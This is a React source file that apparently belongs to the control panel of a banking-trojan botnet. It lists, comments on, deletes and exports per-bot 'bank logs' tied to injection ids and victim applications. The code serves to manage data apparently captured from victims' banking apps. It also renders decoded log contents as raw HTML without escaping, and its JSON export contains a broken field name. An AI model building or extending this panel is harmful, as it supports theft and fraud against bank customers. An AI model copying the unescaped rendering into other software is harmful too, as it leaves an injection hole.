import React from 'react';
import SettingsContext from '../../Settings';
import $ from 'jquery';
import { isNullOrUndefined } from 'util';
import { Link } from 'react-router-dom';
import EditCommentUniversal from '../EditCommentUniversal';
import { try_eval } from '../../serviceF';

//'{"request":"getLogsBank"}' 

class BanksLogsRow extends React.Component {
    constructor(props) {
        super(props);
        this.state = {
          logs: null,
          look: false,
          defaultComment: null
        };

    }

    LookBtnClick() {
        this.setState({
            look: !this.state.look
        });
    }

    ListLogs() {
        let liobj = '';

        for(let obj in this.state.logs) {
            liobj += '<li class="list-group-item">' + obj + ': ' + this.state.logs[obj] + '</li>';
        }

        return (
            <ul class="list-group" dangerouslySetInnerHTML={{__html: liobj}}  />
        );
    }

    LookBtnClass() {
        return this.state.look ? "fal fa-eye" : "fal fa-low-vision";
    }

    componentDidMount() {
        try {
            let _logs = new Buffer(this.props.logs.toString()  == null ? '' : this.props.logs.toString(), 'base64').toString('utf-8');
            this.setState({
                logs: JSON.parse(_logs)
            });
        }
        catch (err) {}
    }

    ChangeDefaultComment(newComment) {
        this.setState({
            defaultComment: newComment
        });
    }

    OnDeleteThis() {
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer('{"request":"deleteLogsBank","idinj":"' + this.props.idinj + '"}').toString('base64')
            }
        });
        
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.props.UpdateThisComponent();
                }
                else {
                    SettingsContext.ShowToast('success', 'Log removed');
                    this.props.UpdateThisComponent();
                }
                
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error removing bank log. Look console for more details.');
                
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));
    }

    render() {
        let loglist = this.state.look ? this.ListLogs() : <React.Fragment />;

        let width = {
            width: this.state.look ? '50%' : '50px',
            padding: '0px'
        }

        let CommentStyle = {
            padding: '5px'
        }

        let _comment = '';
        try {
            if(this.state.defaultComment == null) {
                _comment = new Buffer(this.props.comment.toString()  == null ? '' : this.props.comment.toString(), 'base64').toString('utf-8');
            }
            else {
                _comment = this.state.defaultComment;
            }
        }
        catch (err) {
            _comment = this.props.comment;
        }

        let textAlignCenter = {
            textAlign: 'center'
        }

        return (
            <tr>
                <td>{this.props.idinj}</td>
                {this.props.isBotSelected ? <td><Link class="link" to={"/bank/" + this.props.idbot}>{this.props.idbot}</Link></td> : <React.Fragment />}
                <td>{this.props.application}</td>
                <td class="banks" style={width}><div class="check-bot" style={textAlignCenter}><i class={this.LookBtnClass()} onClick={this.LookBtnClick.bind(this)}></i></div>{loglist}</td>
                <td style={CommentStyle}><EditCommentUniversal parentObj={this} idinj={this.props.idinj} text={_comment} request="editCommentLogsBank" /></td>
                <td class="check-bot" style={({textAlign: 'right',padding: '0px', width:'38px'})}><i class="fal fa-trash-alt" onClick={this.OnDeleteThis.bind(this)} style={({marginRight: '10px'})}></i></td>
            </tr>
        );
    }
}

class BanksLogsTable extends React.Component {
    
    constructor(props) {
        super(props);
        this.state = {
            isBotSelected: isNullOrUndefined(this.props.botID),
            isModal: isNullOrUndefined(this.props.Modal),
            error: null,
            isLoaded: false,
            LogsList: []
        };

        this.onLoadJson = this.onLoadJson.bind(this);
    }
    
    componentDidMount() {
        this.onLoadJson(1);
        try_eval('UpdateToolTips();');
    }

    componentDidUpdate() {
        try_eval('UpdateToolTips();');
    }

    autoUpdate() {
        if(SettingsContext.autoUpdateEnable)
            this._timer = setInterval(() => this.onLoadJson(this.state.currentPage), SettingsContext.autoUpdateDelay * 10);
    }

    componentWillReceiveProps(newProps) {
        this.onLoadJson();
    }

    componentWillUnmount() {
        this.DisableTimer();
    }

    DisableTimer() {
        if (this._timer) {
            clearInterval(this._timer);
            this._timer = null;
        }
    }

    UpdateThisComponent() {
        this.onLoadJson();
    }

    async onLoadJson () {
        if(!this.state.isModal) {
            while(isNullOrUndefined(SettingsContext.restApiUrl)) await SettingsContext.sleep(500);
            while(SettingsContext.restApiUrl.length < 15) await SettingsContext.sleep(500);
        }

        this.DisableTimer();

        let paramslink = this.state.isBotSelected ? '{"request":"getLogsBank"}' : '{"request":"getLogsBank","idbot":"' + this.props.botID + '"}';

        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.restApiUrl,
            data: {
                'params': new Buffer(paramslink).toString('base64')
            }
        });
        this.setState({
            isLoaded: false
        });
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {
                    SettingsContext.ShowToastTitle('error', 'ERROR', result.error);
                    this.setState({
                        error: result.error
                    });
                }
                else {
                    this.setState({
                        isLoaded: true,
                        LogsList: result.logsBanks
                    });
                }
            
            }
            catch (ErrMgs) {
                SettingsContext.ShowToastTitle('error', 'ERROR', 'Error loading Bank Logs. Look console for more details.');
                
                console.log('Error - ' + ErrMgs);
            }
        }.bind(this));

        //this.autoUpdate();
    }

    DownloadLogs() {
        let text = '{"logs":[';
        {this.state.LogsList.map(item => (
            text += new Buffer(item.logs.toString()  == null ? '' : item.lgos.toString(), 'base64').toString('utf-8') + ','
        ))}
        text = text.substring(0, text.length - 1) +  ']}'
        let element = document.createElement('a');
        element.setAttribute('href', 'data:json/plain;charset=utf-8,' + encodeURIComponent(text));
        let FileName = this.state.isBotSelected ? 'BankLogs.json' : 'BankLogs_' + this.props.botID + '.json';
        element.setAttribute('download', FileName);

        element.style.display = 'none';
        document.body.appendChild(element);

        element.click();

        document.body.removeChild(element);
    }

    render () {
        const { error, isLoaded, LogsList } = this.state;
        if (error) {
            return <div>Error: {error}</div>;
        }
        else if (!isLoaded) {
            return <div class="loading">Loading</div>;
        }
        else {
            const tdw = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '31px',
                width: '55px'
        }

            const CommentWidth = {
                padding: '0px',
                textAlign: 'center',
                fontSize: '31px',
                width: '350px'
            }

            const IconsClass = {
                width: '100px'
            }
            console.log(this.state.LogsList);
            return (
                <React.Fragment>
                    <div class="animated fadeIn check-bot" style={({float: 'right',marginRight: '10px',fontSize: '2rem'})}><i data-placement="bottom" data-toggle="tooltip" title="Download logs as JSON" onClick={this.DownloadLogs.bind(this)} class="fas fa-cloud-download-alt"></i></div>
                    {this.state.isModal ? (this.state.isBotSelected? <React.Fragment /> : <Link class="link gobackLink" to="/bank"><i class="far fa-chevron-circle-left"></i> Go to logs</Link>) : <React.Fragment />}
                    <table class="animated fadeIn table table-striped table-dark table-hover ">
                        <thead>
                            <tr>
                            <th scope="col">Id Inj</th>
                            {this.state.isBotSelected ? <th scope="col">Id Bot</th> : <React.Fragment />}
                            <th scope="col">Id App</th>
                            <th scope="col" style={tdw}><i class="far fa-clipboard-list"></i></th>
                            <th scope="col" style={CommentWidth}><i class="far fa-comment-lines"></i></th>
                            <th></th>
                            </tr>
                        </thead>
                        <tbody>
                        {this.state.LogsList.map(item => (
                            <BanksLogsRow UpdateThisComponent={this.UpdateThisComponent.bind(this)} isBotSelected={this.state.isBotSelected} idinj={item.idinj} idbot={item.idbot} application={item.application} logs={item.logs} comment={item.comment} />
                        ))}
                        </tbody>
                    </table>
                </React.Fragment>
            );
        }
    }
}

export default BanksLogsTable;